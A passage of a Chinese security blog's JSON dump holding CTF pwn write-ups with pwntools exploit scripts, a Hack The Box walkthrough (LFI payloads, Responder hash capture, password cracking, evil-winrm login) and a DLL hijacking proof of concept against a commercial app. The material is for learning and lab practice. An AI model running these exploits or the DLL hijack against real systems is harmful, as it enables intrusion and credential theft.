flat(bss,pop_rdi_ret, puts_got, puts_plt, main_addr),)#40=32+8puts_addr = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))print(hex(puts_addr))  #read: 0x7f514c91b020 puts:0x7f37fd048970# libc is provided# libc_base=read_addr-libc.symbols[&#x27;read&#x27;]# system_addr=libc_base+libc.symbols[&#x27;system&#x27;]# binsh_addr=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()# libcsearcher# libc = LibcSearcher(&#x27;read&#x27;, read_addr)# libc_base = read_addr - libc.dump(&#x27;read&#x27;)# system_addr = libc_base + libc.dump(&#x27;system&#x27;)# binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#find by handlibc_base = puts_addr - 0x80970system_addr = libc_base + 0x04F420binsh_addr = libc_base + 0x1B3D88#offical:# p.sendafter(#     b&quot;Show me your magic again\\n&quot;,#     b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr, pop_rsi_r15_ret, 0, 0, system_addr),# )#mango:p.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),)p.interactive()\n\n","categories":["writeup"],"tags":["CTF"]},{"title":"Hack the box: Responder","url":"/2024/01/28/Hack-the-box-Responder/","content":"惯例先扫一下\nnmap -sC -sV -p- -T4 10.129.184.194\n\n\n-sC：此选项启用默认脚本扫描。Nmap包含各种脚本，可用于在扫描期间执行各种任务，如检测常见漏洞、枚举有关目标的信息等。\n-sV：此选项启用版本检测。Nmap将尝试确定运行在开放端口上的服务的版本。\n-p-：这个选项告诉Nmap扫描所有的端口，而不仅仅是常见的端口。 -p- 表示扫描所有65535个端口。\n-T4：这个选项设置扫描的速度&#x2F;敏感度。-T4 表示设置为“Aggressive”模式，这意味着扫描速度较快，但也更容易被目标检测到。\n\n\n\nTask 1被重定向到unika.htb.\n添加到hosts文件\nvim /etc/hosts\n\n\n\n正常访问\n\n\nTask 2scripting language\n在nmap的扫描结果可以发现是php\nTask 3语言，page\n\n\nTask 4Local File Include (LFI)\n..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts\nTask 5Remote File Include (RFI)\n&#x2F;&#x2F;10.10.14.6&#x2F;somefile\nTask 6NTLM stand for : \nNew Technology LAN Manager\n基于挑战&#x2F;应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。\nTask 7Responder 是一个在网络渗透测试和攻击中使用的工具，它可以用于执行 LLNMR（Link-Local Multicast Name Resolution）欺骗攻击，获取目标系统上的用户名和哈希密码。这个工具特别适用于局域网（LAN）环境。\n具体来说，Responder 可以监听和响应 NetBIOS 响应请求，向目标系统发送伪造的 NetBIOS 响应，诱使目标系统发送验证请求，从而获取用户的 NTLMv2 哈希密码。这种攻击方式通常用于获取用户凭据，进行后续的横向移动或其他恶意活动。\n\n\nTask 8John the Ripper\n用于破解NTLM的哈希\nTask 9ifconfig\n\n\n\n监听本地网卡\nresponder -I tun0\n\n\n\n访问\n\n\nresponder捕获了hash\n\n\n把获取到的hash保存到一个文件\n\n\nkali中自带了一些字典，都保存在/usr/share/wordlists,这里我们使用rockyou.txt\n解压\nsudo gzip -d /usr/share/wordlists/rockyou.txt.gz\n\n使用john爆破，尝试许多不同的常见密码，看看是否有任何密码生成相同的质询响应，如果找到一个，我们就知道这就是密码。这通常被称为哈希破解\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash\n\n\n\n得到了密码：badminton\nTask 10我们将使用Windows服务(即在盒子上运行)使用我们恢复的密码远程访问Responder机器。它监听哪个TCP端口?\nnmap扫一下，5985\nTask 11要找flag了。5985搜索后可以得知有一款Windows远程管理Shell工具evil-winrm。这是一款远程渗透工具。教程可以看https://blog.csdn.net/w1304099880/article/details/106843786/\nkali中已经自带了\n这里我换了一个靶机，所以ip有变化。靶机ip为10.129.164.148\n使用evil-winrm\nevil-winrm -i 10.129.164.148 -u Administrator -p badminton\n\n\n\n翻一下\n\n\n\n\n参考：\nhttps://daniel-schwarzentraub.medium.com/htb-tier-1-starting-point-responder-3ff5bca2a522\n","categories":["pentest"],"tags":["hack the box"]},{"title":"NSSCTF Round#16 Basic pwn","url":"/2024/01/13/NSSCTF-Round-16-Basic-pwn/","content":"好简单的两个题。对于我这种半只脚还没踩进pwn坑的小白十分友好。体验了一下ak pwn的感觉。因为考完试太太太困了所以只做了最近在看的pwn（才不是因为misc是流量题瞪眼法十分钟解决不了\nnc_pwnre连接之后发现是一道re\n两个函数的意思是对str中的每个字符循环，和0x10异或\nresult = [...]result = [i ^ 0x10 for i in result]string = &quot;&quot;.join(chr(x) for x in result)print(string)\n\n当re题然后做出来一个假flag(hhh)\n\n\n随便输点东西发现交这个假flag就已经在shell中了，就getshell了。\nret_textida打开看见里面有后门，直接利用。\nbuf是20个字节，read可以读取0x32个，所以可以栈溢出。\n测测偏移\n\n\nfrom pwn import *context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)p = remote(&quot;node7.anna.nssctf.cn&quot;, 28073)# p = process(&quot;./ret_text_v0&quot;)p.sendline(&quot;-2147483648&quot;)p.sendafter(&quot;OK!!!You are right.&quot;, b&quot;a&quot; * 36 + p32(0x08049328))p.interactive()\n\n","categories":["writeup"],"tags":["CTF"]},{"title":"hexo d Error:Spawn failed 问题解决办法","url":"/2024/01/25/hexo%20d%20ErrorSpawn%20failed%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","content":"hexo d失败好几天了，网上大部分的解决办法是重置.deploy_git文件夹，但是对我没有用。\n尝试了ping github.com，超时。\nssh -T git@github.com ，失败。\n感觉应该是网络问题，但是更换了不同的网络，换了代理，换了代理端口，都还是不行。\n最后是更换了ssh的端口成功解决问题了。\n\n进入~&#x2F;.ssh（在win下使用git bash可以使用cd和vim编辑器）\ncd ~/.ssh\n\n创建一个config文件\nvim config\n\n编辑文件内容：\nHost github.comUser gitHostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443Host gitlab.comHostname altssh.gitlab.comUser gitPort 443PreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa\n\n保存退出(:wq)\n\n检查是否成功\nssh -T git@github.com\n\n最后就成功hexo d啦~~~\n参考：\nhttps://blog.csdn.net/weixin_41287260/article/details/124368189\nhttps://blog.zhheo.com/p/128998ac.html\n","categories":["其他"],"tags":["Error","hexo"]},{"title":"pwn练习1","url":"/2024/01/19/pwn%E7%BB%83%E4%B9%A01/","content":"tool\nfile xxx\n\nchecksec –file&#x3D;xxx\n\nobjdump -h xxx\n\nreadelf -W -l xxx\n\nROPgadget –binary xxx –string ‘&#x2F;bin&#x2F;sh’\n\ngdb切换：gdb.sh  gef用于32位  （使用root）\n\n\nrip\n\nfile命令可以查看elf文件的一些信息\ngets危险函数\n\n\nsystem是可以执行shell命令的函数\n\n\n利用gets函数获取一个长字符串覆盖rip来控制程序流到fun()函数\n函数的局部变量会存放在他的栈中，那么在main函数中，我们双击s变量，查看s分配了多少空间\n\n在main的栈帧中给s分配了15个字节\n64位的elf文件,rbp是8个字节\n寄存器rbp:栈基址寄存器,存放当前栈帧的栈底地址\nrsp:栈顶寄存器,存放当前栈帧的栈顶地址\nebp:扩展基址指针寄存器,存储当前函数状态的及地址,在函数运行时不变,可以用来索引\\确定函数参数或局部变量的位置\nesp:栈指针寄存器,esp用来存储函数调用栈的栈顶地址,在压栈和退栈时发生变化.\neip:指令指针寄存器,eip用来存储即将执行的程序指令地址,cpu以找eip的存储内容读取指令并执行,eip随之指向相邻的下一条指令,如此反复,程序就得以连续执行指令\n64位cpu对应RSP（栈顶寄存器）,RBP（栈基寄存器）,RIP（程序计数寄存器）三个寄存器。32位cpu则对应ESP（栈指针寄存器），EBP（扩展基址指针寄存器），EIP（指令指针寄存器）三个寄存器。R开头：64bit, 8字节（1字节&#x3D;8bit）E开头：32bit, 4字节EAX（累加寄存器）是32位， AX 是EAX的低16位 ， AL 和AH是AX的低8位和高8位。AX,BX,CX：16bit, 2字节AH, AL: 8bit, 1字节\n大端序和小端序小端序•低地址存放数据低位、高地址存放数据高位\n•我们所主要关注的格式\n\n\n大端序•低地址存放数据高位、高地址存放数据低位\n\n\n\n\n所以payload里面,我们需要先填充s,再填充rbp,再填充return address\n所以payload可以为’s’*15+’b’*8+p64(0x401186+1).decode(“iso-8859-1”)\nfrom pwn import *p = remote(&quot;node4.buuoj.cn&quot;, 27821)payload = &quot;s&quot; * 15 + &quot;b&quot; * 8 + p64(0x401186 + 1).decode(&quot;iso-8859-1&quot;)p.sendline(payload)p.interactive()  # 将程序切换到交互模式\n\n如果ida地址是红色,按地址,快捷键P\nwarmup_csaw_2016做前两步:1.file 2.checksec\nfile xxxchecksec --file=xxx\n\nstack： no canary found  &#x2F;&#x2F;栈溢出保护未开启 \nPIE： No PIE  &#x2F;&#x2F;地址随机化也没开\n\n\ngets栈溢出漏洞\n\n\n给v5分配了64个字节\n\n\nfrom pwn import *p = remote(&quot;node4.buuoj.cn&quot;, 26574)payload = (    &quot;s&quot; * 64 + &quot;b&quot; * 8 + p64(0x40060D + 1).decode(&quot;iso-8859-1&quot;))  # +1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。p.sendline(payload)p.interactive()  # 将程序切换到交互模式\n\nciscn_2019_n_1 1这个题目的NX是开的\nNX?\nNX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。\n\n\n可以在v1输入一个长串,覆盖v2\n\n\n找到v1和v2的位置\n\n\n覆盖0x30-0x4&#x3D;44个字节给v1,4个字节给v2\n由于v2数值在内存中以16进制存储，所以，找到11.28125的16进制值\n\n\n\n\n所以0x41348000就是那个小数啦\np64p64函数的作用是将一个64位的整数转换为一个8字节的字节串。这个字节串是按照小端字节序排列的，也就是说，低位字节在前，高位字节在后。\n如果你直接将整数0x41348000转换为字符串，然后添加到payload中，那么这个整数将会被转换为一个十进制的字符串，而不是一个字节串。这个字符串的长度并不固定，而且它的内容也不是你想要的字节序列。\n另外，如果你直接将整数0x41348000添加到payload中，Python会抛出一个TypeError，因为不能直接将整数和字符串相加。\n所以，如果你想要将一个64位的整数作为一个8字节的字节串添加到payload中，你应该使用p64函数。\nfrom pwn import *p = remote(&quot;node4.buuoj.cn&quot;, 28498)payload = &quot;s&quot; * 44 + p64(0x41348000).decode(&quot;iso-8859-1&quot;)p.sendline(payload)p.interactive()  # 将程序切换到交互模式\n\nISO-8859-1.decode(&quot;iso-8859-1&quot;)的作用是将字节串转换为字符串。这是因为在Python 3中，字节串和字符串是两种不同的类型，它们不能直接相加。如果你尝试将一个字节串添加到一个字符串，Python会抛出一个TypeError。\nISO-8859-1，也被称为Latin-1，是一种8位的字符编码，它可以表示西欧语言中的字符。在这种编码中，每个字符都被编码为一个8位的字节，所以它可以表示最多256个不同的字符。最重要的是，ISO-8859-1编码是与ASCII编码兼容的，也就是说，ASCII编码中的字符在ISO-8859-1编码中有相同的编码。\n当你使用.decode(&quot;iso-8859-1&quot;)时，每个字节都会被转换为ISO-8859-1编码中对应的字符。这意味着，你可以将任何字节串解码为一个ISO-8859-1编码的字符串，而不会出现解码错误。这对于处理二进制数据非常有用，因为二进制数据可能包含任何字节。\n如果你不使用.decode(&quot;iso-8859-1&quot;)，那么你需要找到另一种方法来将字节串转换为字符串。例如，你可以使用.decode(&quot;utf-8&quot;)，但这只适用于UTF-8编码的字节串。如果字节串包含非UTF-8编码的字节，这将会抛出一个UnicodeDecodeError。\nret2text\n\nchecksec\nArch从这行信息可以知道程序是32bit还是64bit的\n\nRELROFull Relro（重定位表只读）\nRelocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。\n\nStack显示Stack：No canary found则表示可以利用栈溢出\n\nNXNX enable（不可执行内存）\n最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。\n\nPIE（ASLR）\n地址空间分布随机化\n\n\n\n\n\n\n\n\nobjdump读取plt和got表PLT与GOT表均为动态链接过程中的重要部分\nGOT Global Offset Table, 全局偏移表，包含所有需要动态链接的外部函数的地址（在第一次执行后）\nPLT Procedure Link Table, 过程链接表，包含调用外部函数的跳转指令（跳转到GOT表中），以及初始化外部调用指令（用于链接器动态绑定dl_runtime_resolve）\nLinux虚拟内存分段映射中，一般会分出三个相关的段：\n\n.plt: 即上文提到的过程链接表，包含全部的外部函数跳转指令信息\n\nAttributes: Read &#x2F; Execute\n\n\n.got.plt: 即下文将要表达的GOT表，与PLT表搭配使用，包含全部外部函数地址（第一次调用前为伪地址，具体见下）\n\nAttributes: Read &#x2F; Write\n\n\n.got : 存放其他全局符号信息，注意与.got.plt不同，与下文函数动态链接过程关系不大（所以了解不深请见谅，有兴趣的读者也欢迎分享）\n\nAttributes: Read &#x2F; Write\n简单来说，PLT表存放跳转相关指令，GOT表存放外部函数（符号）地址\n\n\n\n\nfrom pwn import *context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 25373)payload = &quot;a&quot; * 32 + &quot;b&quot; * 8 + p64(0x4011FB + 1).decode(&quot;iso-8859-1&quot;)p.sendlineafter(&quot;Show me your magic&quot;, payload)p.interactive()\n\nezshellcode\n\nmmap（Memory Map）是一个用于在进程的虚拟地址空间中创建内存映射区域的系统调用。这个函数允许进程将一个文件或者匿名的内存区域映射到其地址空间，从而可以通过对内存的访问来对文件进行读写，或者在进程间共享数据。\n我们输入的buf写入了0x66660000,下面跳转到了0x66660000，所以可以执行shellcode\n这里也可以看作是代码注入&#x2F;shellcode注入\nfrom pwn import *context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;node5.buuoj.cn&quot;, 27166)p.sendlineafter(&quot;Show me your magic&quot;, asm(shellcraft.sh()))p.interactive()\n\n需要生成shellcode最好在linux执行（在mango使用python2）\nnewstar_shop逻辑阅读\n整数溢出。\nfrom pwn import *sh = remote(&quot;node5.buuoj.cn&quot;, 29444)for i in range(2):    sh.sendlineafter(b&quot;==&quot;, b&quot;1&quot;)    sh.sendlineafter(b&quot;What do you want to buy?&quot;, b&quot;2&quot;)sh.sendlineafter(b&quot;==&quot;, b&quot;3&quot;)sh.sendlineafter(b&quot;==&quot;, b&quot;1&quot;)sh.sendlineafter(b&quot;What do you want to buy?&quot;, b&quot;3&quot;)print(sh.sendline(b&quot;cat flag&quot;))sh.interactive()\n\np1eeeELF是按页对齐，一页是0x1000，所以低三位十六进制的值不会改变\n因为后门函数的地址与有溢出的函数的地址非常接近，所以只需修改最低一字节就能控制程序流到后门\n找到后门的最后一个字节0x6c\nfrom pwn import *context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;node5.buuoj.cn&quot;, 26079)payload = b&quot;a&quot; * 0x20 + p64(0xFFFFFFFF) + p8(0x6C)p.sendlineafter(&quot;A nice try to break pie!!!&quot;, payload)print(p.sendline(b&quot;cat flag&quot;))p.interactive()\n\nRandom随机数猜数。题目是rand+time是真的随机数。可以利用python的ctyeps库同时生成随机数来猜\nshell.py\n\n\nrandom1.c\n\n\ngcc -shared -o random1.so random1.c\n\n\n-shared：这个选项告诉 GCC 生成一个共享库（在 Windows 上是 DLL，在 Unix-like 系统上是 .so 文件）。\n\n-o random1.so：这个选项指定输出文件的名称。在这里，输出文件的名称是 random1.so。\n\nrandom1.c：这是要编译的源代码文件。\n\n\nret2libc1wiki的题目\n\n\nflat可以自动转换\nsystem_plt是在ida中查看到的\n\n\n在ida里发现s占用100，s名称占用4，r变量占用4，+ebp占用4，所以先填充112个垃圾值。将system_plt放到返回值（这个返回值是sys的返回值）。\n不过还是没搞明白为什么只覆盖了sys的返回值不用覆盖ebp。\n然后把参数&#x2F;bin&#x2F;sh放进去\n因为子函数在父函数的栈帧内。\n#!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2libc1&#x27;)binsh_addr = 0x08048720system_plt = 0x08048460payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])sh.sendline(payload)sh.interactive()\n\n还有一个找偏移量的方法\n找偏移量pattern create 150rpattern offset AA8A(在run的结果里看Invalid $PC address,翻译成字符)pattern search\n\n\n\nret2libc是存在pop_rdi_ret的gadget可以利用\n\n在x86_64架构中，函数调用的参数通过寄存器来传递，而不是通过栈来传递。前六个整数或者指针参数是通过rdi,rsi,rdx,rcx,r8,r9这六个寄存器来传递的。如果有更多参数，剩下的参数通过栈传递。\n\n所以要ROP（Return Oriented Programming）来调用一个函数并且操控参数时，就要找到可以控制这些寄存器的gadget。比如\n\npop rdi;ret\npop rsi;popr15;ret(官方wp中使用的)\nret\n\n获取pop_rdi_ret的地址\nROPgadget --binary /... --only &quot;pop|ret&quot;\n\n\n\n\n\n找到偏移为0x20\nbuf是全局变量，被放在bss段上\n\n在 C 语言中，一个变量是在 BSS 段还是在栈上，主要取决于它的声明位置和存储类别：\n\n全局变量和静态变量：这些变量通常存储在 BSS 段。BSS 段用于存储程序中未初始化的全局变量和静态变量。\n局部变量和函数参数：这些变量通常存储在栈上。当一个函数被调用时，它的局部变量和参数会被压入栈中。\n\n\n可以使用objdump -h program//readelf -S program查看bss段的地址（不同环境下bss的地址可能不同）\n使用peda的vmmap可以查看bss段有无执行权限\n所以可以先把buf塞满（0x20），然后塞rbp（0x8，因为在bss段所以可以直接塞bss的起始位置）。rbp塞垃圾值也可以。\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, puts_got, puts_plt, main_addr),)#40=32+8put_addr = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))print(hex(put_addr))\n\n然后因为64位下函数的第一个参数在rdi中，因此把栈顶的值弹出到rdi。在x86_64中，调用函数时，函数的第一个参数是通过rdi寄存器传递的。因此使用pop_rdi_ret这个gadget，把它的地址放在原本的return address处，那么程序就会跳转到pop_rdi_ret的地址处执行它。pop_rdi将此时的栈顶数据（puts函数的地址）弹给rdi，然后ret到plt表的puts处调用puts，那么puts就会找到rdi，打印rdi中puts的地址。puts执行之后，将ret回main_addr。（这里不返回main也可以）\n这样就完成了puts函数地址的泄露，可以用于泄露远程libc的版本。\n这里我还另外打了read的地址。只有一个地址有时会有很多个版本的libc被检索到。https://libc.rip/\n只搜索三个字节（12位）的原因：\n\n即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变\n\n\n\n这样就得到了libc的版本，可以看到有system和/bin/sh的偏移。所以可以计算libc_base，加上偏移得到需要的函数的地址。\nlibc_base = puts_addr - 0x80970system_addr = libc_base + 0x04F420binsh_addr = libc_base + 0x1B3D88\n\n这是手动计算的方法。还有其他两种办法写在完整代码中了。\n现在的目标就是执行system(&#39;/bin/sh&#39;)了。与上面类似，仍然利用栈溢出构造ROP链。\nbss--&gt;pop_rdi_ret--&gt;binsh_addr--&gt;system_addr--main_addr(填rbp--&gt;调整参数为&#x27;/bin/sh&#x27;+ret跳到调用system处--&gt;/bin/sh--&gt;system--&gt;main)\n\n所以可以：\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,system_addr,main_addr),)\n\n然而这样执行程序崩溃了。为什么呢？\n因为在ubuntu18版本以上调用system函数需要栈对齐。\n可以看这一篇文章：\n所以我们加一个ret：\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),)\n\n官方wp的写法：\np.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr, pop_rsi_r15_ret, 0, 0, system_addr),)\n\n大功告成！\nfrom pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#put out debug msg# p=process(&#x27;/home/cake/Documents/pwn/newstar/week2/ret2libc&#x27;) #local testp = remote(&quot;node5.buuoj.cn&quot;, 28657) #far testelf = ELF(&quot;/home/cake/Documents/pwn/newstar/week2/ret2libc&quot;)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]pop_rdi_ret = 0x0000000000400763#find in ROPgadgetpop_rsi_r15_ret = 0x0000000000400761ret = 0x0000000000400506bss = 0x0000000000601040#find in objdumpp.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, puts_got, puts_plt, main_addr),)#40=32+8puts_addr = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))print(hex(puts_addr))  #read: 0x7f514c91b020 puts:0x7f37fd048970# libc is provided# libc_base=read_addr-libc.symbols[&#x27;read&#x27;]# system_addr=libc_base+libc.symbols[&#x27;system&#x27;]# binsh_addr=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()# libcsearcher# libc = LibcSearcher(&#x27;read&#x27;, read_addr)# libc_base = read_addr - libc.dump(&#x27;read&#x27;)# system_addr = libc_base + libc.dump(&#x27;system&#x27;)# binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#find by handlibc_base = puts_addr - 0x80970system_addr = libc_base + 0x04F420binsh_addr = libc_base + 0x1B3D88#offical:# p.sendafter(#     b&quot;Show me your magic again\\n&quot;,#     b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr, pop_rsi_r15_ret, 0, 0, system_addr),# )#mango:p.sendafter(    b&quot;Show me your magic again\\n&quot;,    b&quot;\\x00&quot; * 0x20 + flat(bss,pop_rdi_ret, binsh_addr,ret,system_addr,main_addr),)p.interactive()\n\n\n\npwn1_sctf_2016\n\n找到s距离ebp有0x3C,所以0x3C+4\nfrom pwn import*p=remote(&#x27;node5.buuoj.cn&#x27;,28650)#p=process(&#x27;/home/cake/Documents/pwn/buu/pwn1_sctf_2016&#x27;)payload=b&#x27;I&#x27;*21+b&#x27;f&#x27;+p32(0x08048F0D)p.sendline(payload)p.interactive()\n\njarvisoj_level0\n\nbuf128+rbp8\n\n\nfrom pwn import*p=remote(&#x27;node5.buuoj.cn&#x27;,28299)#p=process(&#x27;/home/cake/Documents/pwn/buu/level0&#x27;)payload=b&#x27;a&#x27;*(128+8)+p64(0x400596)p.sendline(payload)p.interactive()\n\n第五空间pwn5格式化字符串漏洞\n题目生成了一个随机数作为密码，要求输入用户名和密码，密码和随机数匹配了就getshell\n设置了canary无法栈溢出\n随机数被放入了bss段的0x804C044\n可以看到用户名被放在栈上第10个位置\n\n\n%16$n的意思是将已经输出的字符数赋值到第16个参数指向的地址处。那么我们可以巧妙地构造，操控bss处的值\n因为%16$n有5个字符，而地址是4位，所以我们构造四个。\nfrom pwn import *p=remote(&#x27;node5.buuoj.cn&#x27;,28277)#p=process(&#x27;/home/cake/Documents/pwn/buu/pwn5&#x27;)bss=0x804C044payload=b&#x27;AAAA%16$n%17$n%18$n%19$n&#x27;+p32(bss)+p32(bss+1)+p32(bss+2)+p32(bss+3)p.sendline(payload)p.sendline(str(0x04040404))p.interactive()\n\ncanary\n\n有canary\nPIE没有开，可以直接使用函数地址\n\n\n第一个read进来buf，然后print出buf，可以利用格式化字符串漏洞。buf的大小是40，第二个read的限制是0x100，有栈溢出。还找到了backdoor\n\n\n所以可以使用print来泄露canary的值，使用栈溢出来ret2text\n那么先测试一下buf和canary在栈的哪个位置。\n找到第二个read的地址\n\n\n在这里打断点。\n\n\n发现buf在栈的第六个位置\n\n\n第十一个位置的数据最末尾是00，很像canary的00截断\n查看main的汇编\n\n\n找到canary在rbp-0x8位置\n查看canary的地址\n\n\n确实是0x7fffffffdb88\n那么canary在栈的第11个位置\n\nencode()方法是将字符串转换为字节串的方法\n\nfrom pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;node5.buuoj.cn&quot;, 27196)p.sendlineafter(b&quot;Give me some gift?\\n&quot;, &quot;aaaaaaaa%11$p&quot;.encode())p.recvuntil(&quot;aaaaaaaa&quot;)canary = int(p.recvuntil(b&quot;00&quot;).decode(), 16)print(canary)p.sendlineafter(    b&quot;Show me your magic&quot;, b&quot;a&quot; * 40 + p64(canary) + b&quot;a&quot; * 8 + p64(0x401262))p.interactive()\n\n","categories":["CTF"],"tags":["CTF"]},{"title":"dll劫持一个蓝色软件","url":"/2024/04/28/dll%E5%8A%AB%E6%8C%81%E8%85%BE%E8%AE%AF%E4%BC%9A%E8%AE%AE/","content":"过滤出蓝色软件的进程\n\n\n找到有loadlibrary的\n\n\n使用AheadLib生成代码\n\n\n在vs里面创建一个dll项目，把生成的cpp文件复制到dllmain\n注意保留#include &quot;pch.h&quot;\n// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#pragma comment(linker, &quot;/EXPORT:CreateBuglyAgent=client_extensionOrg.CreateBuglyAgent,@1&quot;)#define EXTERNC extern &quot;C&quot;#define EXPORT __declspec(dllexport)#define ALCPP EXPORT NAKED#define ALSTD EXTERNC EXPORT NAKED void __stdcall#define ALCFAST EXTERNC EXPORT NAKED void __fastcall#define ALCDECL EXTERNC NAKED void __cdeclBOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123;    STARTUPINFO si = &#123; sizeof(si) &#125;;    PROCESS_INFORMATION pi;    CreateProcess(TEXT(&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;), NULL, NULL, NULL, false, 0, NULL, NULL, &amp;si, &amp;pi);    if (dwReason == DLL_PROCESS_ATTACH)    &#123;        DisableThreadLibraryCalls(hModule);    &#125;    else if (dwReason == DLL_PROCESS_DETACH)    &#123;    &#125;    return TRUE;&#125;\n\n成功劫持\n","categories":["toys"],"tags":["toys","dll"]},{"title":"ret2csu-level5","url":"/2024/01/29/ret2csu-level5/","content":"ret2csu在64位程序中，当函数参数小于等于6个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9，大于6个时放到栈上。\n在大多数情况下，参数过多时很难找到部署寄存器值的gadget。但是还有一写万能gadget可以被利用，__libc_csu_init这个函数用于对libc进行初始化操作。\n\n\n\n\n\n\nlevel5蒸米的level5  https://github.com/zhengmin1989/ROP_STEP_BY_STEP\n\n\n\n\n栈溢出\n没有system之类的可以利用的。那么就要先泄露libc，然后调用了。\n找到__libc_csu_init\n\n\n第一段在0x04005f0，第二段在0x0400606\n第一次栈溢出的目的是通过write函数打出write的地址\nwrite函数原型\nssize_t write (int fd, const void * buf, size_t count)\n\nfd 为文件描述符，fd为1时为标准输出\nbuf 需要输出的内存地址\ncount 输出字节数\n那么rdi&#x3D;1，rsi&#x3D;write@got，rdx&#x3D;8，正好是第一段__libc_csu_init\n给这三个寄存器赋值需要用到第二段__libc_csu_init，给r13，r14，r15附上对应的。第二段其实就是pop [寄存器]\n可以得到一个通用的利用函数：\ndef csu(rbx, rbp, r12, r13, r14, r15, arg):    payload = b&#x27;a&#x27; * (128 + 8)    payload += p64(csu_init_2)    payload += p64(0) # 可能是调用了函数之后rsp+8了，所以这里补个0，有点困惑    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_init_1)    payload += b&#x27;a&#x27; * (0x38) # 平衡堆栈    payload += p64(arg)    p.sendline(payload)    sleep(1)\n\n\n\n因为这个地方，所以rbx&#x3D;0，rbp&#x3D;1，r12&#x3D;write@got\n\n平衡堆栈问题：\n首先跳转到六个move的地方给寄存器赋值，然后ret到三个move的地方将参数转移到需要的寄存器中去，但是六个move运行后会再次执行一遍三个move，这样会使得栈空间提升8*7总共56字节，所以我们还需要padding56个字节，然后才能覆盖ret到需要的地址上去\n\n使用0x38个字节填充了：\n\n\n可以看到这个下面也有一句add rsp,38h\n第一次溢出：\ncsu(0, 1, write_got, 1, write_got, 8, main_addr)\n\n不同版本的__libc_csu_init有所不同，要注意参数和寄存器对应的关系。(wiki里的level5不是蒸米的level5)\n第二次溢出：\ncsu(0, 1, read_got, 0, bss_base, 16, main_addr)\n\n因为call qword ptr [r12+rbx*8]是间接跳转，也就是先将r12地址的值取出来，再进行跳转。最后的效果就是，从bss_base中取出system函数的地址，再跳转到system函数处。\n第三次溢出：\ncsu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)\n\n调用execve(“&#x2F;bin&#x2F;sh”)\n一开始是打算使用system的，但是又遇到了栈对齐问题，而且这一次怎么都无法解决，只好换成execve。很奇怪啊，添加ret和给system的地址从1加到16都没有解决。\n写了两个版本的exp方便自己看\nexp1:\nfrom ctypes import *from struct import packfrom LibcSearcher import *from pwn import *banary = &quot;/home/cake/Documents/pwn/wiki/medium_rop/level5&quot;elf = ELF(banary)ip = &quot;node5.buuoj.cn&quot;port = 25363local = 1if local:    p = process(banary)else:    p = remote(ip, port)context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=&quot;amd64&quot;)# context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, 